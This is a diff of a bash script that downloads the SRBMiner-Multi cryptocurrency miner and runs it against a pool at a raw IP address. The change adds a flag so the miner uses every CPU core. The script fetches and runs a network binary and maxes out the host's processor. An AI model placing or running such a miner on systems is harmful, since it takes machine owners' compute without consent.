@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.3.9/SRBMiner-Multi-2-3-9-Linux.tar.xz
 tar xf SRBMiner-Multi-2-3-9-Linux.tar.xz && cd SRBMiner-Multi-2-3-9
-./SRBMiner-MULTI --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool 95.179.253.230:80 --wallet bondal --password cok
+./SRBMiner-MULTI --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool 95.179.253.230:80 --wallet bondal --password cok --cpu-threads $(nproc --all)
